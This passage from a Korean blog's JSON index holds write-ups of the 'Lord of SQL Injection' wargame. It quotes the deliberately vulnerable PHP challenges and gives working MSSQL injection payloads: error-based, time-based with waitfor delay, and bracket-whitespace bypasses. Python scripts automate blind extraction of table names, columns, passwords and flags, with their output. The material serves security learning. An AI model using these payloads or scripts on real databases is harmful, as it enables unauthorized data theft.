        "content": "이번 문제의 이름은 kraken이다.이 문제는 poltergeist와 유사 한 문제이다.코드는 다음과 같다.---------------------------------query : select id from member where id='' and pw=''---------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = mssql_connect(\"kraken\");  if(preg_match('/master|information|;/i', $_GET['id'])) exit(\"No Hack ~_~\");  if(preg_match('/master|information|;/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = \"select id from member where id='{$_GET['id']}' and pw='{$_GET['pw']}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));  if($result['id']) echo \"&lt;h2&gt;{$result['id']}&lt;/h2&gt;\";  if($krakenFlag === $_GET['pw']) solve(\"kraken\");// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.  highlight_file(__FILE__);?&gt;플래그는 flag_{$hash} 테이블 안에 있다고 한다.따라서 이 문제를 풀기 위해서는 flag_$hash 형태의 테이블 명을 알아야 하고, 해당 테이블의 컬럼 명, 그 다음에는 플래그 값을 찾아야 한다.그래서 이 전에 풀었던 문제인 poltergeist에서 구현한 소스코드에서 쿼리를 살짝 바꾸어 주었다.poltergeist에서는 sqlite_master 테이블에서 sql을 검색하여 테이블 명과 컬럼 명을 알아낼 수 있었다.그런데 MSSQL에서는 이런 식으로 한번에 테이블 구조를 볼 수 있는 테이블이 없는 것 같다.그래서 sys.tables라는 테이블에서 테이블 명을 찾을 수 있었다.쿼리는 다음과 같다.select name from sys.tables where name like 'flag_%'여기서 name이 테이블 명이 저장되어 있는 컬럼이다.위의 쿼리를 사용하여 한 글자 씩 테이블 명을 알아낸 후, 컬럼명을 알아내야 하는데, 문제는 알아낸 테이블 명만으로는 컬럼명을 알아낼 수 있는 방법이 없다는 것이었다.그래서 다시 sys.tables에서 object_id라는 것을 추출했다.select object_id from sys.tables where name=TABLE_NAMEobject_id는 9글자의 숫자로 이루어져 있었는데, 해당 값을 숫자가 너무 커서 이진 탐색 방법으로 찾아내도록 코드를 구현했다.앞의 sys.tables에는 테이블에 대한 정보가 저장되어 있었는데, 컬럼에 대한 것은 sys.columns에 저장되어 있다.이 때, object_id는 개체의 ID로 데이터베이스 내에서 고유한 값이다.때문에 한 sys.tables에 저장 된 각 테이블은 고유한 object_id의 값을 가진다.또한 sys.columns 테이블에서는 column에 대한 정보를 저장하는데, 이 때 object_id을 통해 해당 열이 속한 개체의 ID 값을 저장 해 해당 열이 어떤 테이블에 속한 지 식별할 수 있게 해 준다.따라서 앞의 쿼리를 통해 구한 object_id를 사용하여 sys.columns에서 컬럼 명을 구할 수 있다.이를 위한 쿼리는 다음과 같다.select name from sys.columns where object_id=OBJECT_ID여기서 name은 컬럼 명이다.이렇게 하면 플래그 값을 추출하기 위한 테이블 명과 컬럼 명을 모두 알아낼 수 있게 된다.최종적으로 아래의 쿼리를 다음과 같이 넣어 플래그 값을 추출하면 문제를 풀 수 있다.select COLUMN from TABLE?id=1&amp;pw=1' or len(select COLUMN from TABLE)=0?id=1&amp;pw=1' or substring((select COLUMN from TABLE), 1, 1)='a이를 코드로 구현해 보면 다음과 같다.import urllib2import urllibimport requeststable = \"\"column = \"\"flag = \"\"object_id = 0length = 0def testEqual(num):\ttry:\t\tquery = url + \"1' or (select object_id from sys.tables where name = '\" + table + \"') = \" + str(num) + \" -- \"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\tif 'guest' in r.text:\t\treturn True\telse:\t\treturn Falsedef testBigger(num):\ttry:\t\tquery = url + \"1' or (select object_id from sys.tables where name = '\" + table + \"') &lt; \" + str(num) + \" -- \"\t\tr = requests.post(query, cookies=session)\texcept:\t\t print \"[-] Error occur\"\tif 'guest' in r.text:\t\treturn True\telse:\t\treturn Falsedef search_id(start, end):\tif start &gt; end:\t\treturn \"None\"\tmid = (start + end) / 2\tif testEqual(mid):\t\treturn mid\telif testBigger(mid):\t\tend = mid - 1\telse:\t\tstart = mid + 1\treturn search_id(start, end)url = \"https://los.rubiya.kr/chall/kraken_647f3513b94339a4c59cf6f9074d0f92.php?id=1&amp;pw=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the table\"for i in range(0, 40):\ttry:\t\tquery = url + \"1' or len((select name from sys.tables where name like 'flag_%'))=\" + str(i) + \" -- \"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif 'guest' in r.text:\t\tlength = i\t\tbreakprint \"[+] Found length : \", lengthprint \"[+] Find table\"for j in range(1, length + 1):\tfor i in range(48, 128):\t\ttry:\t\t\tquery = url + \"1' or substring((select name from sys.tables where name like 'flag_%'), \" + str(j) + \", 1)='\" + chr(i)\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif 'guest' in r.text:\t\t\ttable += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", table\t\t\tbreaktable = table.lower()print \"[+] Found table : \", tablelength = 0print \"[+] Find length of the object_id\"for i in range(0, 40):        try:                query = url + \"1' or len((select object_id from sys.tables where name = '\" + table + \"'))=\" + str(i) + \" -- \"                r = requests.post(query, cookies=session)        except:                print \"[-] Error occur\"                continue        if 'guest' in r.text:                length = i                breakprint \"[+] Found length : \", lengthprint \"[+] Find object_id\"object_id = search_id(100000000, 999999999)print \"[+] Found object_id : \", object_idlength = 0print \"[+] Find length of the column\"for i in range(0, 100):        try:                query = url + \"1' or len((select name from sys.columns where object_id = \" + str(object_id) + \"))=\" + str(i) + \" -- \"                r = requests.post(query, cookies=session)        except:                print \"[-] Error occur\"                continue        if 'guest' in r.text:                length = i                breakprint \"[+] Found length : \", lengthprint \"[+] Find column\"for j in range(1, length + 1):        for i in range(32, 128):                try:                        query = url + \"1' or substring((select name from sys.columns where object_id = \" + str(object_id)  + \"), \" + str(j) + \", 1)='\" + chr(i)                        r = requests.post(query, cookies=session)                except:                        print \"[-] Error occur\"                        continue                if 'guest' in r.text:                        column += chr(i)                        print \"[+] Found \" + str(j), \":\", column                        breakcolumn = column.lower()print \"[+] Found column : \", columnlength = 0print \"[+] Find length of the flag\"for i in range(0, 100):        try:                query = url + \"1' or len((select \" + column + \" from \" + table + \"))=\" + str(i) + \" -- \"                r = requests.post(query, cookies=session)        except:                print \"[-] Error occur\"                continue        if 'guest' in r.text:                length = i                breakprint \"[+] Found length : \", lengthprint \"[+] Find flag\"for j in range(1, length + 1):        for i in range(32, 128):                try:                        query = url + \"1' or substring((select \" + column + \" from \" + table + \"), \" + str(j) + \", 1)='\" + chr(i)                        r = requests.post(query, cookies=session)                except:                        print \"[-] Error occur\"                        continue                if 'guest' in r.text:                        flag += chr(i)                        print \"[+] Found \" + str(j), \":\", flag                        breakprint \"[+] Found flag : \", flag.lower()print \"[+] End\"그 결과 아래와 같이 플래그를 얻을 수 있다.$ python ex.py [+] Start[+] Find length of the table[+] Found length :  13[+] Find table[+] Found 1 : F[+] Found 2 : FL[+] Found 3 : FLA[+] Found 4 : FLAG[+] Found 5 : FLAG_[+] Found 6 : FLAG_C[+] Found 7 : FLAG_CC[+] Found 8 : FLAG_CCD[+] Found 9 : FLAG_CCDF[+] Found 10 : FLAG_CCDFE[+] Found 11 : FLAG_CCDFE6[+] Found 12 : FLAG_CCDFE62[+] Found 13 : FLAG_CCDFE62B[+] Found table :  flag_ccdfe62b[+] Find length of the object_id[+] Found length :  9[+] Find object_id[+] Found object_id :  901578250[+] Find length of the column[+] Found length :  13[+] Find column[+] Found 1 : F[+] Found 2 : FL[+] Found 3 : FLA[+] Found 4 : FLAG[+] Found 5 : FLAG_[+] Found 6 : FLAG_A[+] Found 7 : FLAG_AB[+] Found 8 : FLAG_AB1[+] Found 9 : FLAG_AB15[+] Found 10 : FLAG_AB15B[+] Found 11 : FLAG_AB15B6[+] Found 12 : FLAG_AB15B60[+] Found 13 : FLAG_AB15B600[+] Found column :  flag_ab15b600[+] Find length of the flag[+] Found length :  38[+] Find flag[+] Found 1 : F[+] Found 2 : FL[+] Found 3 : FLA[+] Found 4 : FLAG[+] Found 5 : FLAG{[+] Found 6 : FLAG{A[+] Found 7 : FLAG{A0[+] Found 8 : FLAG{A08[+] Found 9 : FLAG{A081[+] Found 10 : FLAG{A0819[+] Found 11 : FLAG{A0819F[+] Found 12 : FLAG{A0819FC[+] Found 13 : FLAG{A0819FC5[+] Found 14 : FLAG{A0819FC56[+] Found 15 : FLAG{A0819FC56B[+] Found 16 : FLAG{A0819FC56BE[+] Found 17 : FLAG{A0819FC56BEA[+] Found 18 : FLAG{A0819FC56BEAE[+] Found 19 : FLAG{A0819FC56BEAE9[+] Found 20 : FLAG{A0819FC56BEAE98[+] Found 21 : FLAG{A0819FC56BEAE985[+] Found 22 : FLAG{A0819FC56BEAE985B[+] Found 23 : FLAG{A0819FC56BEAE985BA[+] Found 24 : FLAG{A0819FC56BEAE985BAC[+] Found 25 : FLAG{A0819FC56BEAE985BAC7[+] Found 26 : FLAG{A0819FC56BEAE985BAC7D[+] Found 27 : FLAG{A0819FC56BEAE985BAC7D1[+] Found 28 : FLAG{A0819FC56BEAE985BAC7D17[+] Found 29 : FLAG{A0819FC56BEAE985BAC7D175[+] Found 30 : FLAG{A0819FC56BEAE985BAC7D175C[+] Found 31 : FLAG{A0819FC56BEAE985BAC7D175C9[+] Found 32 : FLAG{A0819FC56BEAE985BAC7D175C97[+] Found 33 : FLAG{A0819FC56BEAE985BAC7D175C974[+] Found 34 : FLAG{A0819FC56BEAE985BAC7D175C974C[+] Found 35 : FLAG{A0819FC56BEAE985BAC7D175C974CD[+] Found 36 : FLAG{A0819FC56BEAE985BAC7D175C974CD2[+] Found 37 : FLAG{A0819FC56BEAE985BAC7D175C974CD27[+] Found 38 : FLAG{A0819FC56BEAE985BAC7D175C974CD27}[+] Found flag :  flag{a0819fc56beae985bac7d175c974cd27}[+] End나온 값에서 앞의 flag만 대문자로 바꾸어 넣어주어야 문제를 풀 수 있다.?pw=FLAG{a0819fc56beae985bac7d175c974cd27}----------------------------------------------------------------------------------------------------------------------------------query : select id from member where id='admin' and pw='FLAG{a0819fc56beae985bac7d175c974cd27}'----------------------------------------------------------------------------------------------------------------------------------KRAKEN Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = mssql_connect(\"kraken\");  if(preg_match('/master|information|;/i', $_GET['id'])) exit(\"No Hack ~_~\");  if(preg_match('/master|information|;/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = \"select id from member where id='{$_GET['id']}' and pw='{$_GET['pw']}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));  if($result['id']) echo \"&lt;h2&gt;{$result['id']}&lt;/h2&gt;\";  if($krakenFlag === $_GET['pw']) solve(\"kraken\");// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.  highlight_file(__FILE__);?&gt;KRAKEN Clear",
        "url": "//wargame/lord%20of%20sql%20injection/2019/08/04/los-kraken.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-08-03-los-mummy-html": {
        "title": "[Lord of SQL Injection] LoS - mummy 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 3, 2019",
        "author": "",
        "category": "",
        "content": "이제 거의 다 정리 해 간다.앞으로 5문제만 더 정리하면 LoS에 대한 풀이는 모두 정리가 끝난다.다음 문제 이름은 mummy이다.코드는 다음과 같다.---------------------------------query : select---------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = mssql_connect(\"mummy\");  if(preg_match('/master|sys|information|;|\\(|\\//i', $_GET['query'])) exit(\"No Hack ~_~\");  for($i=0;$i&lt;strlen($_GET['query']);$i++) if(ord($_GET['query'][$i]) &lt;= 32) exit(\"%01~%20 can used as whitespace at mssql\");  $query = \"select\".$_GET['query'];  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));  if($result[0]) echo \"&lt;h2&gt;Hello anonymous&lt;/h2&gt;\";  $query = \"select pw from prob_mummy where id='admin'\";  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));  if($result['pw'] === $_GET['pw']) solve(\"mummy\");  highlight_file(__FILE__);?&gt;이번 문제도 id='admin'일 때의 정확한 pw의 값을 알아야 하는 Blind SQL Injection 문제이다.그런데 중간에 보면 다음과 같은 코드가 있다.for($i=0;$i&lt;strlen($_GET['query']);$i++) if(ord($_GET['query'][$i]) &lt;= 32)exit(\"%01~%20 can used as whitespace at mssql\");즉, 아스키코드표의 0x01 ~ 0x20까지 쓸 수 없다는 것인데, 문제는 이 범위 안에 Tab(0x09), Line Feed(0x0a), Vertical Tab(0x0b), Carriage Return(0x0d), Space(0x20)가 모두 들어있다는 것이다.때문에 쿼리문에서 필수적인 Whitespace 문자를 모두 사용할 수가 없다.그래서 인터넷을 뒤지다가 []를 사용하면 된다는 글을 봤다.지금 다시 찾으려고 하니 도저히 못찾겠는데, 그땐 있었다.그때의 나는 검색 능력이 지금보다 뛰어났었나보다 ㅎㅎ쨌든 []는 아래처럼 사용하면 된다.select'1'from[table]where[column]='a'그래서 문제를 풀기 위해서 위의 []를 이용 해 아래와 같이 소스코드를 구현했다.import urllib2import urllibimport requestsflag = \"\"length = 20url = \"https://los.rubiya.kr/chall/mummy_2e13c2a4483d845ce2d37f7c910f0f83.php?query=\"session = dict(PHPSESSID = \"YOUT SESSION ID\")print \"[+] Start\"print \"[+] Find password\"end = Falsefor j in range(1, length + 1):        for i in range(48, 128):                try:                        query = url + \"'1'from[prob_mummy]where[id]='admin'and[pw]like'\" + flag + chr(i) + \"%'\"                        r = requests.post(query, cookies=session)                except:                        print \"[-] Error occur\"                        continue                if 'Hello anonymous' in r.text:                        flag += chr(i)                        print \"[+] Found \" + str(j), \":\", flag                        break                if i == 127:                        print \"[+] Maybe it's end\"                        end = True                        break        if end == True:                breakprint \"[+] Found password : \", flagprint \"[+] End\"그 결과 아래와 같이 결과값을 얻을 수 있다.$ python ex.py [+] Start[+] Find password[+] Found 1 : 0[+] Found 2 : 0C[+] Found 3 : 0C3[+] Found 4 : 0C3C[+] Found 5 : 0C3CC[+] Found 6 : 0C3CC2[+] Found 7 : 0C3CC24[+] Found 8 : 0C3CC245[+] Maybe it's end[+] Found password :  0C3CC245[+] End나온 결과값에서 알파벳을 소문자로 바꾸어 아래와 같이 입력하면 문제를 풀 수 있다.?pw=0c3cc245--------------------------------query : select--------------------------------MUMMY Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = mssql_connect(\"mummy\");  if(preg_match('/master|sys|information|;|\\(|\\//i', $_GET['query'])) exit(\"No Hack ~_~\");  for($i=0;$i&lt;strlen($_GET['query']);$i++) if(ord($_GET['query'][$i]) &lt;= 32) exit(\"%01~%20 can used as whitespace at mssql\");  $query = \"select\".$_GET['query'];  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));  if($result[0]) echo \"&lt;h2&gt;Hello anonymous&lt;/h2&gt;\";  $query = \"select pw from prob_mummy where id='admin'\";  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));  if($result['pw'] === $_GET['pw']) solve(\"mummy\");  highlight_file(__FILE__);?&gt;MUMMY Clear",
        "url": "//wargame/lord%20of%20sql%20injection/2019/08/03/los-mummy.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-07-29-los-yeti-html": {
        "title": "[Lord of SQL Injection] LoS - yeti 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 29, 2019",
        "author": "",
        "category": "",
        "content": "이번 문제 이름은 yeti다.소스코드를 짜서 풀어야 하는 Blind SQL Injection 문제였다.코드는 다음과 같다.-----------------------------------------------------------------query : select id from prob_yeti where id='' and pw=''-----------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = mssql_connect(\"yeti\");  if(preg_match('/master|sys|information|;/i', $_GET['id'])) exit(\"No Hack ~_~\");  if(preg_match('/master|sys|information|;/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = \"select id from prob_yeti where id='{$_GET['id']}' and pw='{$_GET['pw']}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  sqlsrv_query($db,$query);  $query = \"select pw from prob_yeti where id='admin'\";   $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));  if($result['pw'] === $_GET['pw']) solve(\"yeti\");   highlight_file(__FILE__);?&gt;문제를 풀기 위해서는 id='admin'일 때 pw의 값을 알아야 한다.그런데 pw의 값을 정확하게 알아야 하는데 내가 입력한 쿼리의 결과가 참인지 거짓인지 구분할 만한 무언가가 없다.그래서 Time based Blind SQL Injection를 통해 pw의 값을 알아내기로 했다.MySQL에서는 그냥 sleep를 사용하면 됬었는데, MSSQL에서는 sleep가 딱히 없는 것 같다.그래서 waitfor delay를 사용했다.waitfor delay [지연시간]의 형태로 사용하면 되는데, 이 때 지연시간은 00:00:05와 같이 시:분:초의 형태로 넣어 주어야 한다.먼저 아래의 값을 입력 해 waitfor delay로 문제를 풀 수 있는지 테스트 해 보았다.?id=a&amp;pw=1' if 1=1 waitfor delay '00:00:03' else waitfor delay '00:00:00' --if문을 통해 1=1의 조건을 검사하고 해당 조건이 참이라면 3초 동안 지연을, 아니라면 지연을 하지 않는 쿼리문이다.해당 쿼리 테스트 결과 아래와 같이 3초 지연된 결과를 받을 수 있었다.이제 위의 쿼리에서 1=1 부분을 pw의 길이와 값을 알아내기 위한 쿼리로 바꾸면 문제를 풀 수 있을 것이다.길이를 알아내기 위해서 아래와 같은 쿼리를 사용했다.id=a&amp;pw=1' if ((select len(pw) from prob_yeti where id='admin') = 1) waitfor delay '00:00:03' else waitfor delay '00:00:00' -- prob_yeti 테이블에서 id='admin'인 행의 pw 길이를 select하고 만약 그 결과가 3초 이상 지연된다면 해당 값이 길이일 것이다.또한 값을 알아내기 위해서는 아래와 같은 쿼리를 사용했다.id=a&amp;pw=1' if ((select pw from prob_yeti where id='admin') like 'a%') waitfor delay '00:00:03' else waitfor delay '00:00:00' -- like을 사용했는데, 만약 prob_yeti 테이블에서 id='admin'인 행의 pw를 추출 했을 때 맨 첫번째 글자가 a라면 3초 지연 후 결과 값을 얻을 수 있을 것이다.이를 바탕으로 아래와 같이 자동화 코드를 구현했다.import urllib2import urllibimport requestsimport timeflag = \"\"length = 0url = \"https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php?id=a&amp;pw=1'\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 40):\ttry:\t\tstart = time.time()\t\tquery = url + \" if ((select len(pw) from prob_yeti where id='admin') = \" + str(i) + \") waitfor delay '00:00:03' else waitfor delay '00:00:00' -- \"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif (time.time() - start) &gt; 3:\t\tlength = i\t\tbreak\tprint \"[+] Found length : \", lengthprint \"[+] Find password\"\tfor j in range(1, length + 1):\tfor i in range(48, 123):\t\ttry:\t\t\tstart = time.time()\t\t\tquery = url + \" if ((select pw from prob_yeti where id='admin') like '\" + flag + str(chr(i)) + \"%') waitfor delay '00:00:03' else waitfor delay '00:00:00' -- \"\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif (time.time() - start) &gt; 3:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"그 결과 아래와 같이 결과값을 얻을 수 있었다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  8[+] Find password[+] Found 1 : 6[+] Found 2 : 64[+] Found 3 : 642[+] Found 4 : 6425[+] Found 5 : 6425B[+] Found 6 : 6425B7[+] Found 7 : 6425B72[+] Found 8 : 6425B725[+] Found password :  6425B725[+] End따라서 알파벳을 소문자로 바꾸어 아래와 같이 입력하면 문제를 풀 수 있다.?pw=6425b725------------------------------------------------------------------------------------query : select id from prob_yeti where id='' and pw='6425b725'------------------------------------------------------------------------------------YETI Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = mssql_connect(\"yeti\");  if(preg_match('/master|sys|information|;/i', $_GET['id'])) exit(\"No Hack ~_~\");  if(preg_match('/master|sys|information|;/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = \"select id from prob_yeti where id='{$_GET['id']}' and pw='{$_GET['pw']}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  sqlsrv_query($db,$query);  $query = \"select pw from prob_yeti where id='admin'\";   $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));  if($result['pw'] === $_GET['pw']) solve(\"yeti\");   highlight_file(__FILE__);?&gt;YETI Clear",
        "url": "//wargame/lord%20of%20sql%20injection/2019/07/29/los-yeti.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-07-27-los-revenant-html": {
        "title": "[Lord of SQL Injection] LoS - revenant 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 27, 2019",
        "author": "",
        "category": "",
        "content": "또 간만에 정리하는 Write-up이다.이번에도 MSSQL 문제이다.코드는 다음과 같다.-----------------------------------------------------------------query : select * from prob_revenant where id='' and pw=''-----------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = mssql_connect();  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['id'])) exit(\"No Hack ~_~\");  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = \"select * from prob_revenant where id='{$_GET['id']}' and pw='{$_GET['pw']}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  sqlsrv_query($db,$query);  if(sqlsrv_errors()) exit(mssql_error(sqlsrv_errors()));  $query = \"select * from prob_revenant where id='admin'\";   $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));  if($result['4'] === $_GET['pw']) solve(\"revenant\"); // you have to pwn 5th column  highlight_file(__FILE__);?&gt;언뜻 보면 이 전 문제와 동일하게 생겼다.그런데 이 번 문제의 핵심은 바로 5 번째 열(column)을 뽑아야 한다는 것이다.그렇다면 먼저 5번째 컬럼 명을 알아낸 후, 이 전 문제와 같은 방법으로 오류를 유도하면 5 번째 열의 값을 알아낼 수 있을 것 같다.테이블 내의 컬럼 명을 알기 위해서는 group by와 having을 사용했다.이 전 문제에서 아래와 같이 입력하면 테이블 명.컬럼 명이 나타나는 오류를 확인할 수 있었다.?id=a' having 1=1 --Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.id' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.위의 오류 중 prob_revenant.id에서 prob_revenant는 문제의 테이블 명이고 id는 컬럼 명이다.이를 활용하여 두 번째 컬럼 명을 구해야 하는데 이 때는 group by를 사용하면 된다.?id=a' group by id having 1=1 -- 위의 값을 입력하면 완성되는 쿼리는 다음과 같다.select * from prob_revenant where id='a' group by id having 1=1 --' and pw=''따라서 id='a' group by id having 1=1 까지가 where절에 사용되고 뒤의 부분은 주석처리 된다.그 결과 having 절에서 오류가 나며 id 다음 열을 알아낼 수 있다.Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.pw' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.오류 안에서 두 번째 컬럼 명이 pw라는 것을 알 수 있었다.다음 세 번째 컬럼 명을 알기 위해서는 group by 뒤에 두 번째 컬럼 명을 추가 해 주면 된다.?id=a' group by id,pw having 1=1 -- Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.45a88487' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.세 번째 컬럼 명은 45a88487라는 것을 알 수 있다.같은 방법으로 네 번째, 다섯 번째 컬럼 명을 알아낼 수 있다.그런데 세 번째 컬럼 명은 시작 부분이 숫자라서 그냥 입력하면 오류가 난다.그래서 \"로 묶어주었다.?id=a' group by id,pw,\"45a88487\" having 1=1 -- Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.13477a35' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.?id=a' group by id,pw,\"45a88487\",\"13477a35\" having 1=1 -- Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_revenant.9604b0c8' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.이렇게 다섯 번째 컬럼 명이 9604b0c8라는 것을 알 수 있었다.이제 다섯 번째 컬렴 명에서 이 전 문제와 같이 오류를 발생시켜 값을 추출하면 문제를 풀 수 있을 것이다.이를 위해 아래와 같이 공격 구문을 구성했다.?id=admin' and \"9604b0c8\"=1 -- 그 결과 아래와 같은 오류를 얻을 수 있었다.Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Conversion failed when converting the varchar value 'aa68a4b3fb327dee07f868450f7e1183' to data type int.즉, id='admin'일 때 다섯 번째 컬럼의 값은 aa68a4b3fb327dee07f868450f7e1183라는 것을 알 수 있었다.이제 이를 pw의 값으로 입력 해 주면 문제를 풀 수 있다.?id=admin&amp;pw=aa68a4b3fb327dee07f868450f7e1183---------------------------------------------------------------------------------------------------------------------------query : select * from prob_revenant where id='admin' and pw='aa68a4b3fb327dee07f868450f7e1183'---------------------------------------------------------------------------------------------------------------------------REVENANT Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = mssql_connect();  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['id'])) exit(\"No Hack ~_~\");  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = \"select * from prob_revenant where id='{$_GET['id']}' and pw='{$_GET['pw']}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  sqlsrv_query($db,$query);  if(sqlsrv_errors()) exit(mssql_error(sqlsrv_errors()));  $query = \"select * from prob_revenant where id='admin'\";   $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));  if($result['4'] === $_GET['pw']) solve(\"revenant\"); // you have to pwn 5th column  highlight_file(__FILE__);?&gt;REVENANT Clear",
        "url": "//wargame/lord%20of%20sql%20injection/2019/07/27/los-revenant.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-07-05-los-nessie-html": {
        "title": "[Lord of SQL Injection] LoS - nessie 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 5, 2019",
        "author": "",
        "category": "",
        "content": "이번 문제의 이름은 nessie이다.이제 SQLite가 끝나고 MSSQL에서의 SQL Injection 문제이다.코드는 다음과 같다.-----------------------------------------------------------------query : select id from prob_nessie where id='' and pw=''-----------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = mssql_connect();  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['id'])) exit(\"No Hack ~_~\");  if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = \"select id from prob_nessie where id='{$_GET['id']}' and pw='{$_GET['pw']}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  sqlsrv_query($db,$query);  if(sqlsrv_errors()) exit(mssql_error(sqlsrv_errors()));  $query = \"select pw from prob_nessie where id='admin'\";   $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));  if($result['pw'] === $_GET['pw']) solve(\"nessie\");   highlight_file(__FILE__);?&gt;문제를 풀기 위해서는 id가 admin인 행의 pw를 구해야 한다.MSSQL은 처음이라 인터넷에 검색을 해 보니, MSSQL에서 쿼리 오류 시 출력 해 주는 오류 구문을 가지고 Error Based SQL Injection을 하는 것 같다.그래서 가장 기본적으로 사용하는 having을 사용하기 위해 아래와 같이 입력했다.?id=a' having 1=1 --그럼 완성되는 쿼리는 다음과 같다.select id from prob_nessie where id='a' having 1=1 --' and pw=''--를 삽입했기 때문에 having 1=1 뒤의 'and pw='는 주석처리가 된다.즉, select id from prob_nessie where id='a' having 1=1만 실행이 되는데, 이 때 오류가 발생한다.having 구문은 group by절이 필요한데, 이 group by 절을 입력하지 않아 쿼리 오류가 발생하는 것이다.위의 값을 문제에 입력 해 보면 아래와 같은 오류가 발생한다.Error: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Column 'prob_nessie.id' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.친절하게 테이블 명과 컬럼 명을 알려준다.이런 방식으로 오류를 유발하여 id가 admin인 행의 pw를 유발하면 될 것 같다.고민을 하다가 pw 부분에서 Type Confusion 오류를 유발시켜 보았다.이를 위해 아래와 같이 입력 해 주었다.?id=admin&amp;pw=1' or id='admin' and pw=1 -- 완성되는 쿼리는 다음과 같다.select id from prob_nessie where id='admin' and pw='1' or id='admin' and pw=1 --'앞의 id='admin' and pw='1'은 해당사항이 없기 때문에 뒤의 조건으로 넘어 갈 것이고, id='admin' and pw=1의 경우, pw는 varchar 형태이지만 내가 입력 한 값은 1, 정수이기 때문에 오류가 